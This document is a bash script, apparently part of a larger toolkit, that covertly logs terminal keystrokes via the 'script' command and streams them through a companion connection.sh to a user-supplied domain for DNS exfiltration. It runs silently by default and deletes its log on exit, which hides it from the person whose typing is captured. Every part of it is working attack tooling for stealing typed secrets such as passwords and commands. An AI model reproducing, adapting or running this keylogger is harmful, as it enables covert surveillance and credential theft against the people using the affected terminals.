#!/bin/bash
# Log terminal keystrokes and send to dns exfiltrator
# Usage: logger.sh [-options] domain
# Positional Arguments:
#   domain: the domain to send data to
# Options:
#   -p path: give path to log file to listen to
#   -l: run the logger with warnings and errors printed

# check if already running
# is_running=`ps aux | grep -i "logger.sh" | grep -v "grep" | wc -l`
# if [ $is_running -gt 2 ]; then
#   echo "Already running"
#   exit 1
# fi

# globals/constants
log_file_path="/tmp/file-$(date +%s).log"
domain=""
silent=1

# check command line options
while [ $# -gt 0 ]; do
  # check if server is on localhost
  if [ $1 = "-p" ]; then
    if ! [ -n "$2" ]; then
      if [ $silent -eq 0 ]; then
        echo "You must specify a directory when using the -p option"
      fi
      exit 1
    fi
    if ! [ -d "$2" ]; then
      if [ $silent -eq 0 ]; then
        echo "Directory does not exist"
      fi
      exit 1
    fi
    log_file_path="$2/file-$(date +%s).log"
    shift
  elif [ $1 = "-l" ]; then
    silent=0
  else
    # if it isn't an option, must be a positional argument
    domain="$1"
    shift
  fi
  shift
done

if ! [ -t 0 ]; then
  if [ $silent -eq 0 ]; then
    echo "The logger must be ran in an interactive shell"
  fi
  exit 1
fi

if [ -z $domain ]; then
  if [ $silent -eq 0 ]; then
    echo "Must supply a domain!"
  fi
  exit 1
fi

touch "$log_file_path"

# start background script to check for changes in log file
if [ $silent -eq 0 ]; then
  tail -f "$log_file_path" | ./connection.sh "$domain" &
else
  tail -f "$log_file_path" | ./connection.sh "$domain" &>/dev/null &
fi

bg_pid=$!
# start logger
script -f -q -I "$log_file_path" 2> /dev/null

# stop background script and delete log file
kill $bg_pid &> /dev/null
rm "$log_file_path"
exit 0